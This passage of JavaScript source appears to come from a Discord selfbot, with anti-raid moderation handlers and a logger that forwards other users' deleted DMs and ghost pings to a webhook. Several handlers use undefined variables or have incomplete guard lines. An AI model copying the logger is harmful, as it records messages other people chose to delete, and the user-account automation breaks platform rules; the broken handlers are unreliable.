                    client.interval[`afk-${message.channel?.id}`] = true
                    message.reply(`**Je suis afk pour \`${tools.afk_message}\`**`).then(m => setTimeout(() => m.delete().catch(() => false) && delete client.interval[`afk-${message.channel?.id}`], 5000))
                }
            }
    
            if (message.guild && gestion[message.guildId] && gestion[message.guildId].piconly.includes(message.channel?.id) && message.author?.id !== client.user?.id && message.attachments.size === 0 && !message.member.permissions.has("MANAGE_MESSAGES")) message.delete().then(() => message.channel.send(`**${message.member} ce salon est un salon PICONLY**`).then(m => setTimeout(() => m.delete().catch(() => false), 5000)))
            if (message.guild && gestion[message.guildId] && gestion[message.guildId].autopublish === true && message.channel.type === "GUILD_NEWS") message.crosspost().catch(() => false)
            if (message.guild && gestion[message.guildId] && gestion[message.guildId].autoreact[message.channel?.id]?.reactions){
                gestion[message.guildId].autoreact[message.channel?.id]?.reactions.forEach(reaction => {
                    message.react(reaction).catch(() => false)
                })
            }
    })

    client.on('messageReactionRemove', async (reaction, user) => {
        if (!gestion[reaction.message.guildId]) return;
        if (gestion[reaction.message.guildId]?.rolemenu[reaction.message?.id]?.some(o => o.reaction === reaction.emoji.name)){
            const role = reaction.message.guild.roles.cache.get(gestion[reaction.message.guildId]?.rolemenu[reaction.message?.id].find(o => o.reaction === reaction.emoji.name).roleId)
            const member = await reaction.message.guild.members.fetch(user?.id).catch(() => false)
            if (role && member && member.roles.cache.has(role?.id)) member.roles.remove(role) 
        }
    })

    client.on('presenceUpdate', async (oldPresence, newPresence) => {
        if (!newPresence.guild || !newPresence.member || !gestion[newPresence.guild.id]) return;
        const role = newPresence.member.guild.roles.cache.get(gestion[newPresence.guildId]?.soutiens.role);
        const status = gestion[newPresence.guildId]?.soutiens.status

        if (!role || !status) return;
        if (newPresence.member.presence?.activities.some(activity => activity.type === "CUSTOM" && activity.state.includes(status))) {
            if (role && !newPresence.member.roles.cache.has(role?.id)) 
                newPresence.member.roles.add(role)
                    .catch(() => false);
        } else {
            if (role && newPresence.member.roles.cache.has(role?.id)) {
                newPresence.member.roles.remove(role)
                    .catch(() => false);
            }
        }
    })

    client.on('guildMemberAdd', async member => {
        if (!gestion[member.guild.id]) return;
        if (!member.guild.members.me.permissions.has("MANAGE_ROLES")) return;
        if (gestion[member.guild.id]?.autorole.length === 0) return;
        gestion[member.guild.id].autorole.forEach(id => member.roles.add(member.guild.roles.cache.get(id)).catch(() => false))
    })

    client.on('messageDelete', async message => {
        if (!message || !message.author || !message.author?.id)
        if (message.channel.type === "DM" && logger.activate && logger.webhook && logger.delete && !message.author?.bot && message.author?.username){
            if (message.author?.id === client.user?.id) return;
            const t = await fetch(logger.webhook).catch(() => false)
            if (t.status !== 200) return;

            const webhook = new discord.WebhookClient({url: logger.webhook })
            const embed = new discord.MessageEmbed()
                .setColor("#00ffb1")
                .setAuthor({name: message.author.username, iconURL: message.author.avatarURL({dynamic: true})})
                .setTitle("<a:diamand:1228335341098893333>・DM Supprimé・<a:diamand:1228335341098893333>")
                .addFields({name: "Auteur : ", value: `${message.author.username} (${message.author})`})
                .addFields({name: "Contenu : ", value: `${message.content || "Rien"}`})
                .addFields({name: "Fichiers :", value: `${message.attachments.size > 0 ? message.attachments.map(lien => `[fichier](${lien})`).join(', ') : "Aucun"}`})
                .setTimestamp()
                .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
        
            webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
        }
        if (Date.now() - (message.createdTimestamp + 1000 * 30) < 0 && logger.activate && logger.webhook && !message.author?.bot && message.author?.username && logger.ghostping && message.content?.includes(`<@${client.user?.id}>`)){
            if (message.author?.id === client.user?.id) return;

            const t = await fetch(logger.webhook).catch(() => false)
            if (t.status !== 200) return;

            const webhook = new discord.WebhookClient({url: logger.webhook })
            const embed = new discord.MessageEmbed()
                .setColor("#00ffb1")
                .setAuthor({name: message.author.username, iconURL: message.author.avatarURL({dynamic: true})})
                .setTitle("<a:diamand:1228335341098893333>・Ghostping・<a:diamand:1228335341098893333>")
                .addFields({name: "Serveur : ", value: `${message.guild?.name || "Aucun serveur"}`})
                .addFields({name: "Salon : ", value: `${message.channel || "Inconnu"}`})
                .addFields({name: "Auteur : ", value: `${message.author.username} (${message.author})`})
                .addFields({name: "Contenu : ", value: `${message.content || "Rien"}`})
                .addFields({name: "Fichiers :", value: `${message.attachments.size > 0 ? message.attachments.map(lien => `[fichier](${lien})`).join(', ') : "Aucun"}`})
                .setTimestamp()
                .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
        
            webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
        }
    })


    // Anti Raid

    client.on('channelCreate', async channel => {
        if (channel.type === "GROUP_DM"){
            if (logger.activate && logger.groups && logger.webhook){
                const t = await fetch(logger.webhook).catch(() => false)
                if (t.status !== 200) return;
        
                const webhook = new discord.WebhookClient({url: logger.webhook })
                const embed = new discord.MessageEmbed()
                    .setColor("#00ffb1")
                    .setTitle("<a:diamand:1228335341098893333>・Groupe Rejoint・<a:diamand:1228335341098893333>")
                    .addFields({name: "Nom : ", value: `${channel.name || "Aucun"}`})
                    .addFields({name: "Propriétaire : ", value: `<@${channel.ownerId}>`})
                    .setTimestamp()
                    .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
                
                webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
                  
            }

            if (antigroupe.activate === true){
                if (channel.ownerId === client.user?.id) return;
                if (antigroupe.sendmessage === true && antigroupe.message) await channel.send(antigroupe.message).catch(() => false)
                channel.delete(antigroupe.discret ?? false).catch(() => false)        
            }
        }
        else if (!channel.guild) return;
        
        console.log(`[ ${red("LOGS")} ]`)
        console.log(green("Un channel a été crée:"))
        console.log(green("Nom du channel: " + channel.name))
        console.log(green("ID du channel: " + channel?.id))
        console.log(green("Sur le serveur: " + channel.guild?.name || "Inconnu"))

        if (!antiraid[channel.guildId] || !antiraid[channel.guildId].protected) return;
        if (!antiraid[channel.guildId].antichannel) return;
        if (!channel.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        if (channel.parentId){
            if (!client.cachedChannels.get(channel.parentId)) client.cachedChannels.set(channel.parentId, [])
            let cat = client.cachedChannels.get(channel.parentId)
            if (cat) cat.push(channel?.id)
        }

        const action = await channel.guild.fetchAuditLogs({type: 10, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[channel.guildId].whitelist.includes(action.executor?.id)) return;

        const member = await channel.guild.members.fetch(action.executor?.id).catch(() => false)

        if (member?.manageable && antiraid[channel.guildId].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[channel.guildId].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[channel.guildId].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)
    
        channel.delete("RSZ Anti Raid").catch(() => false)
    })


    client.on('channelDelete', async channel => {
        if (channel.type === "GROUP_DM"){
            if (logger.activate && logger.groups && logger.webhook){
                const t = await fetch(logger.webhook).catch(() => false)
                if (t.status !== 200) return;
    
                const webhook = new discord.WebhookClient({url: logger.webhook })
                const embed = new discord.MessageEmbed()
                    .setColor("#00ffb1")
                    .setTitle("<a:diamand:1228335341098893333>・Groupe Quitté・<a:diamand:1228335341098893333>")
                    .addFields({name: "Nom : ", value: `${channel.name || "Aucun"}`})
                    .addFields({name: "Propriétaire : ", value: `<@${channel.ownerId}>`})
                    .setTimestamp()
                    .setFooter({text: `${client.user.username}・R$Z Logger`, iconURL: `${client.user.displayAvatarURL({dynamic: true})}`})
            
                webhook.send({embeds: [embed], username: `${client.user.username} | RSZ Logger` })
            }    
        }
        if (!channel.guild) return;
        
        console.log(`[ ${red("LOGS")} ]`)
        console.log(green("Un channel a été supprimé:"))
        console.log(green("Nom du channel: " + channel.name))
        console.log(green("Sur le serveur: " + channel.guild.name))

        if (!antiraid[channel.guildId] || !antiraid[channel.guildId].protected) return;
        if (!antiraid[channel.guildId].antichannel) return;
        if (!channel.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await channel.guild.fetchAuditLogs({type: 12, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[channel.guildId].whitelist.includes(action.executor?.id)) return;

        const member = await channel.guild.members.fetch(action.executor?.id).catch(() => false)

        if (member?.manageable && antiraid[channel.guildId].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[channel.guildId].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[channel.guildId].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)
    
        const newchannel = await channel.clone({
            name: channel.name,
            permissions: channel.permissionsOverwrites,
            type: channel.type,
            topic: channel.withTopic,
            nsfw: channel.nsfw,
            birate: channel.bitrate,
            userLimit: channel.userLimit,
            rateLimitPerUser: channel.rateLimitPerUser,
            permissions: channel.withPermissions,
            position: channel.rawPosition,
            reason: `Antichannel`
        })

        if (channel.type === 4){
            client.cachedChannels.set(newchannel?.id, client.cachedChannels.get(channel?.id))
            client.cachedChannels.delete(channel?.id)
            const a = client.cachedChannels.get(newchannel?.id)
            if (a) a.forEach((id) => {
                const child = channel.guild.channels.cache.get(id)
                child?.setParent(newchannel)
            })
        }
        else{
            const categoryids = Array.from(client.cachedChannels.keys())
            categoryids.forEach(c => {
                if (!client.cachedChannels.get(c).includes(channel?.id)) return;
                client.cachedChannels.get(c).push(newchannel?.id)
                newchannel.setParent(c).catch(() => false)
            })
        }
    })


    client.on('channelUpdate', async (oldChannel, newChannel) => {
        if (!oldChannel.guild) return;
        if (!antiraid[oldChannel.guildId] || !antiraid[oldChannel.guildId].protected) return;
        if (!antiraid[oldChannel.guildId].antichannel) return;
        if (!oldChannel.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        if (oldChannel.parentId !== newChannel.parentId){
            if (!client.cachedChannels.get(newChannel.parentId)) client.cachedChannels.set(newChannel.parentId, [])
            let ncat = client.cachedChannels.get(newChannel.parentId)
            let ocat = client.cachedChannels.get(oldChannel.parentId)
            if (ncat) ncat.push(newChannel?.id)
            if (ocat) ocat.splice(newChannel?.id, 1)
        }

        const action = await oldChannel.guild.fetchAuditLogs({type: 11, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[oldChannel.guildId].whitelist.includes(action.executor?.id)) return;

        const member = await oldChannel.guild.members.fetch(action.executor?.id).catch(() => false)

        if (member?.manageable && antiraid[oldChannel.guildId].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[oldChannel.guildId].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[oldChannel.guildId].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

        newChannel.edit({
            name: oldChannel.name,
            permissions: oldChannel.permissionsOverwrites,
            type: oldChannel.type,
            topic: oldChannel.withTopic,
            nsfw: oldChannel.nsfw,
            birate: oldChannel.bitrate,
            userLimit: oldChannel.userLimit,
            rateLimitPerUser: oldChannel.rateLimitPerUser,
            position: oldChannel.rawPosition,
            reason: `Antichannel`
        }).catch(() => false)
        newChannel.overwritePermissions(oldChannel.permissionOverwrites).catch(() => false)
    })

    client.on("guildBanAdd", async ban => {
        if (!ban.guildId) return;
        if (!antiraid[ban.guild.id] || !antiraid[ban.guild.id].protected) return;
        if (!antiraid[ban.guild.id].antiban) return;
        if (!ban.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await ban.guild.fetchAuditLogs({type: 22, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[ban.guild.id].whitelist.includes(action.executor?.id)) return;

        const member = await ban.guild.members.fetch(action.executor?.id).catch(() => false)
        if (member?.manageable && antiraid[ban.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[ban.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[ban.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

        ban.guild.bans.remove(ban.user, "R$Z Anti Ban").catch(() => false)
    })

    client.on("guildMemberRemove", async m => {
        if (!m.guild.id) return;
        if (!antiraid[m.guild.id] || !antiraid[m.guild.id].protected) return;
        if (!antiraid[m.guild.id].antikick) return;
        if (!m.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await m.guild.fetchAuditLogs({type: 20, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[m.guild.id].whitelist.includes(action.executor?.id)) return;

        const member = await m.guild.members.fetch(action.executor?.id).catch(() => false)
        if (member?.manageable && antiraid[m.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[m.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[m.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)
    })

    client.on("guildMemberAdd", async m => {
        if (!m.guild.id) return;
        if (!antiraid[m.guild.id] || !antiraid[m.guild.id].protected) return;
        if (!m.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        if (m.user?.bot){
            if (!antiraid[m.guild.id].antibot) return;

            const action = await m.guild.fetchAuditLogs({type: 28, limit: 1}).then(a => a.entries.first()).catch(() => false)
            if (!action?.executor) return;
            if (action.executor?.id === client.user?.id) return;
            if (antiraid[m.guild.id].whitelist.includes(action.executor?.id)) return;

            const member = await m.guild.members.fetch(action.executor?.id).catch(() => false)
            if (member?.manageable && antiraid[m.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
            if (member?.kickable && antiraid[m.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
            if (member?.bannable && antiraid[m.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

            m.kick("RSZ Anti Raid")
        }
        else if (antiraid[m.guild.id].antidc && Date.now() - (m.user.createdTimestamp + 1000 * 60 * 60 * 24 * 7) < 0) m.kick("RSZ Anti DC")
    })

    client.on('roleCreate', async role => {
        if (!role.guild.id) return;
        
        console.log(`[ ${red("LOGS")} ]`)
        console.log(green("Un role a été crée:"))
        console.log(green("Nom du role: " + role.name))
        console.log(green("ID du role: " + role?.id))
        console.log(green("Sur le serveur: " + role.guild.name))

        if (!antiraid[role.guild.id] || !antiraid[role.guild.id].protected) return;
        if (!antiraid[role.guild.id].antirole) return;
        if (!role.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await role.guild.fetchAuditLogs({type: 30, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[role.guild.id].whitelist.includes(action.executor?.id)) return;

        const member = await role.guild.members.fetch(action.executor?.id).catch(() => false)
        if (member?.manageable && antiraid[role.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[role.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[role.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

        role.delete("RSZ Anti Raid").catch(() => false)
    })

    client.on('roleDelete', async role => {
        if (!role.guild.id) return;

        console.log(`[ ${red("LOGS")} ]`)
        console.log(green("Un role a été supprimé:"))
        console.log(green("Nom du role: " + role.name))
        console.log(green("ID du role: " + role?.id))
        console.log(green("Sur le serveur: " + role.guild.name))

        if (!antiraid[role.guild.id] || !antiraid[role.guild.id].protected) return;;
        if (!antiraid[role.guild.id].antirole) return;
        if (!role.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await role.guild.fetchAuditLogs({type: 32, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[role.guild.id].whitelist.includes(action.executor?.id)) return;

        const member = await role.guild.members.fetch(action.executor?.id).catch(() => false)
        if (member?.manageable && antiraid[role.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[role.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[role.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

        role.guild.roles.create({
            name: role.name,
            color: role.hexColor,
            permissions: role.permissions,
            hoist: role.hoist,
            mentionable: role.mentionable,
            position: role.position,
            reason: `RSZ Anti Role`
        }).catch(() => false)
    })

    client.on('roleUpdate', async (oldRole, newRole) => {
        if (!oldRole.guild.id) return;
        if (!antiraid[oldRole.guild.id] || !antiraid[oldRole.guild.id].protected) return;
        if (!antiraid[oldRole.guild.id].antirole) return;
        if (!oldRole.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await oldRole.guild.fetchAuditLogs({type: 31, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[oldRole.guild.id].whitelist.includes(action.executor?.id)) return;

        const member = await oldRole.guild.members.fetch(action.executor?.id).catch(() => false)
        if (member?.manageable && antiraid[oldRole.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[oldRole.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[oldRole.guild.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

        await newRole.edit({
            data: {
                name: oldRole.name,
                color: oldRole.hexColor,
                permissions: oldRole.permissions,
                hoist: oldRole.hoist,
                mentionable: oldRole.mentionable,
                position: oldRole.rawPosition,
                reason: `R$Z Anti Role`
            }
        }).catch(() => false)
    })

    client.on('messageCreate', async message => {
        if (!message.guildId) return;
        
        if (!antiraid[message.guildId] || !antiraid[message.guildId].protected) return;
        if (!antiraid[message.guildId].antiping) return;
        if (!message.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        if (message.webhookId){
            if (!message.content?.includes("@everyone") && !message.content?.includes("@here")) return;
            let ee = await message.channel.clone({
                name: channel.name,
                permissions: channel.permissionOverwrites,
                type: channel.type,
                topic: channel.withTopic,
                nsfw: channel.nsfw,
                birate: channel.bitrate,
                userLimit: channel.userLimit,
                rateLimitPerUser: channel.rateLimitPerUser,
                permissions: channel.withPermissions,
                position: channel.rawPosition,
                reason: `R$Z Anti Raid`
            }).catch(() => false)

            message.channel.delete("Anti Raid").catch(() => {
                ee.delete().catch(() => false)
                message.channel.fetchWebhooks().then(webhooks => webhooks?.forEach(w => w?.delete().catch(() => false)))
            })

            const action = await message.guild.fetchAuditLogs({type: 50, limit: 1}).then(a => a.entries.first()).catch(() => false)
            if (!action?.executor) return;
            if (action.executor?.id === client.user?.id) return;
            if (antiraid[message.guildId].whitelist.includes(action.executor?.id)) return;
    
            const member = await message.guild.members.fetch(action.executor?.id).catch(() => false)
            if (member?.manageable && antiraid[message.guildId].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
            if (member?.kickable && antiraid[message.guildId].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
            if (member?.bannable && antiraid[message.guildId].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)    
        }
        else {
            if (message.author?.id === client.user?.id) return;
            if (!message.member.permissions.has("MENTION_EVERYONE")) return;
            if (antiraid[message.guildId].whitelist.includes(message.author?.id)) return;
            if (!message.content?.includes("@everyone") && !message.content?.includes("@here")) return;

            if (message.member?.manageable && antiraid[message.guildId].sanction === 1) message.member.roles?.set([], "RSZ Anti Raid").catch(() => false)
            if (message.member?.kickable && antiraid[message.guildId].sanction === 2) message.member.kick("RSZ Anti Raid").catch(() => false)
            if (message.member?.bannable && antiraid[message.guildId].sanction === 3) message.member.ban({reason: "RSZ Anti Raid"}).catch(() => false)    
        }
    })

    client.on('messageCreate', async message => {
        if (!message || !message.author || !message.author?.id)
        if (!message.guildId) return;
        
        if (!antiraid[message.guildId] || !antiraid[message.guildId].protected) return;
        if (!antiraid[message.guildId].antispam) return;
        if (!message.guild.members.me.permissions.has("ADMINISTRATOR")) return;
        if (message.author?.id === client.user?.id) return;
        if (antiraid[message.guildId].whitelist.includes(message.author?.id)) return;

        let channelData = client.messages.get(message.channel?.id) || new Map();
        let userData = channelData.get(message.author?.id) || { count: 0, lastMessage: null };
        let interval = 2000

        if (userData.lastMessage && (message.createdTimestamp - userData.lastMessage < interval)) userData.count++;
        else userData.count = 1;
        
        userData.lastMessage = message.createdTimestamp;
        channelData.set(message.author?.id, userData);
        client.messages.set(message.channel?.id, channelData);

        if (userData.count > 5 && !client.currentSpams.has(message.channel?.id)) {
            client.currentSpams.add(message.channel?.id);
            const userMessages = Array.from(userData);

            userMessages.forEach(m => m.delete().catch(() => false))

            channelData.delete(message.author?.id);
            client.messages.set(message.channel?.id, channelData);
        }
    })

    client.on('messageCreate', async message => {
        if (!message.guildId) return;
        
        if (!antiraid[message.guildId] || !antiraid[message.guildId].protected) return;
        if (!antiraid[message.guildId].antilink) return;
        if (!message.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        if (message.author?.id === client.user?.id) return;
        if (antiraid[message.guildId].whitelist.includes(message.author?.id)) return;

        if (!linksall.some((word) => message.content.toLowerCase().includes(word))) return;

        if (message.webhookId){
            message.delete().catch(() => false)
            message.fetchWebhook().then(webhooks => webhooks?.forEach(w => w?.delete().catch(() => false))).catch(() => false)

            const action = await message.guild.fetchAuditLogs({type: 50, limit: 1}).then(a => a.entries.first()).catch(() => false)
            if (!action?.executor) return;
            if (action.executor?.id === client.user?.id) return;
            if (antiraid[message.guildId].whitelist.includes(action.executor?.id)) return;
    
            const member = await message.guild.members.fetch(action.executor?.id).catch(() => false)
            if (member?.manageable && antiraid[message.guildId].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
            if (member?.kickable && antiraid[message.guildId].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
            if (member?.bannable && antiraid[message.guildId].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)    
        }
        else {
            message?.member?.timeout(1000 * 60)
            .catch(() => {
                if (message.member?.manageable && antiraid[message.guildId].sanction === 1) message.member.roles?.set([], "RSZ Anti Raid").catch(() => false)
                if (message.member?.kickable && antiraid[message.guildId].sanction === 2) message.member.kick("RSZ Anti Raid").catch(() => false)
                if (message.member?.bannable && antiraid[message.guildId].sanction === 3) message.member.ban({reason: "RSZ Anti Raid"}).catch(() => false)        
            })

            message.delete().catch(() => false)
        }
    })

    client.on('messageUpdate', async (oldMessage, newMessage) => {
        if (!newMessage || !newMessage.author || !newMessage.author?.id)
        if (!newMessage.guildId) return;
        if (!newMessage?.author) return;
        if (!antiraid[newMessage.guildId] || !antiraid[newMessage.guildId].protected) return;
        if (!antiraid[newMessage.guildId].antilink) return;
        if (!newMessage.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        if (newMessage.author?.id === client.user?.id) return;
        if (antiraid[newMessage.guildId].whitelist.includes(newMessage.author?.id)) return;

        if (!linksall.some((word) => newMessage.content.toLowerCase().includes(word))) return;

        if (newMessage.webhookId){
            newMessage.delete().catch(() => false)
            newMessage.fetchWebhook().then(webhooks => webhooks?.forEach(w => w?.delete().catch(() => false))).catch(() => false)

            const action = await newMessage.guild.fetchAuditLogs({type: 50, limit: 1}).then(a => a.entries.first()).catch(() => false)
            if (!action?.executor) return;
            if (action.executor?.id === client.user?.id) return;
            if (antiraid[newMessage.guildId].whitelist.includes(action.executor?.id)) return;
    
            const member = await newMessage.guild.members.fetch(action.executor?.id).catch(() => false)
            if (member?.manageable && antiraid[newMessage.guildId].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
            if (member?.kickable && antiraid[newMessage.guildId].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
            if (member?.bannable && antiraid[newMessage.guildId].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)    
        }
        else {
            message.member.timeout(1000 * 60)
            .catch(() => {
                if (newMessage.member?.manageable && antiraid[newMessage.guildId].sanction === 1) newMessage.member.roles?.set([], "RSZ Anti Raid").catch(() => false)
                if (newMessage.member?.kickable && antiraid[newMessage.guildId].sanction === 2) newMessage.member.kick("RSZ Anti Raid").catch(() => false)
                if (newMessage.member?.bannable && antiraid[newMessage.guildId].sanction === 3) newMessage.member.ban({reason: "RSZ Anti Raid"}).catch(() => false)        
            })

            newMessage.delete().catch(() => false)
        }
    })

    client.on('webhookUpdate', async (channel) => {
        if (!channel.guild) return;
        
        if (!antiraid[channel.guildId] || !antiraid[channel.guildId].protected) return;
        if (!antiraid[channel.guildId].antiwebhook) return;
        if (!channel.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await channel.guild.fetchAuditLogs({type: 50, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[channel.guildId].whitelist.includes(action.executor?.id)) return;

        const member = await channel.guild.members.fetch(action.executor?.id).catch(() => false)

        if (member?.manageable && antiraid[channel.guildId].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[channel.guildId].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[channel.guildId].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

        const webhooks = await message.channel.fetchWebhooks();
        if (webhooks.size === 0) return;
        webhooks.forEach(w => w?.delete().catch(() => false))
    })

    client.on('guildUpdate', async (oldGuild, newGuild) => {
        if (!oldGuild) return;
        
        if (!antiraid[oldGuild?.id] || !antiraid[oldGuild?.id].protected) return;
        if (!antiraid[oldGuild?.id].antiguildupdate) return;
        if (!oldGuild.members.me.permissions.has("ADMINISTRATOR")) return;

        const action = await oldGuild.fetchAuditLogs({type: 1, limit: 1}).then(a => a.entries.first()).catch(() => false)
        if (!action?.executor) return;
        if (action.executor?.id === client.user?.id) return;
        if (antiraid[oldGuild?.id].whitelist.includes(action.executor?.id)) return;

        const member = await oldGuild.members.fetch(action.executor?.id).catch(() => false)

        if (member?.manageable && antiraid[oldGuild?.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
        if (member?.kickable && antiraid[oldGuild?.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
        if (member?.bannable && antiraid[oldGuild?.id].sanction === 3) member.ban({reason: "RSZ Anti Raid"}).catch(() => false)

        if (oldGuild.name !== newGuild.name) await newGuild.setName(oldGuild.name)
        if (oldGuild.region !== newGuild.region) await newGuild.setRegion(oldGuild.region)
        if (oldGuild.widget !== newGuild.widget) await newGuild.setWidget(oldGuild.widget)
        if (oldGuild.splashURL() !== newGuild.splashURL()) await newGuild.setSplash(oldGuild.splashURL())
        if (oldGuild.bannerURL() !== newGuild.bannerURL()) await newGuild.setBanner(oldGuild.bannerURL())
        if (oldGuild.afkChannel !== newGuild.afkChannel) await newGuild.setAFKChannel(oldGuild.afkChannel)
        if (oldGuild.afkTimeout !== newGuild.afkTimeout) await newGuild.setAFKTimeout(oldGuild.afkTimeout)
        if (oldGuild.vanityURLCode !== newGuild.vanityURLCode) newGuild.setVanityCode(oldGuild.vanityURLCode)
        if (oldGuild.rulesChannel !== newGuild.rulesChannel) await newGuild.setRulesChannel(oldGuild.rulesChannel)
        if (oldGuild.systemChannel !== newGuild.systemChannel) await newGuild.setSystemChannel(oldGuild.systemChannel)
        if (oldGuild.verificationLevel !== newGuild.verificationLevel) await newGuild.setVerificationLevel(oldGuild.verificationLevel)
        if (oldGuild.systemChannelFlags !== newGuild.systemChannelFlags) await newGuild.setSystemChannelFlags(oldGuild.systemChannelFlags)
        if (oldGuild.publicUpdatesChannel !== newGuild.publicUpdatesChannel) await newGuild.setPublicUpdatesChannel(oldGuild.publicUpdatesChannel)
        if (oldGuild.iconURL() !== newGuild.iconURL()) await newGuild.setIcon(oldGuild.iconURL({ dynamic: true }))
        if (oldGuild.defaultMessageNotifications !== newGuild.defaultMessageNotifications) await newGuild.setDefaultMessageNotifications(oldGuild.defaultMessageNotifications)
    })

    client.on('guildMemberUpdate', async (oldMember, newMember) => {
        if (!oldMember.guild.id) return;
        
        if (!antiraid[oldMember.guild.id] || !antiraid[oldMember.guild.id].protected) return;
        if (!antiraid[oldMember.guild.id].antimemberupdate) return;
        if (!oldMember.guild.members.me.permissions.has("ADMINISTRATOR")) return;

        if (oldMember.roles.cache.size > newMember.roles.cache.size) {
            const action = await oldMember.guild.fetchAuditLogs({type: 25, limit: 1}).then(a => a.entries.first()).catch(() => false)
            if (!action?.executor) return;
            if (action.executor?.id === client.user?.id) return;
            if (antiraid[oldMember.guild.id].whitelist.includes(action.executor?.id)) return;
    
            const member = await oldMember.guild.members.fetch(action.executor?.id).catch(() => false)
    
            if (member?.manageable && antiraid[oldMember.guild.id].sanction === 1) member.roles?.set([], "RSZ Anti Raid").catch(() => false)
            if (member?.kickable && antiraid[oldMember.guild.id].sanction === 2) member.kick("RSZ Anti Raid").catch(() => false)
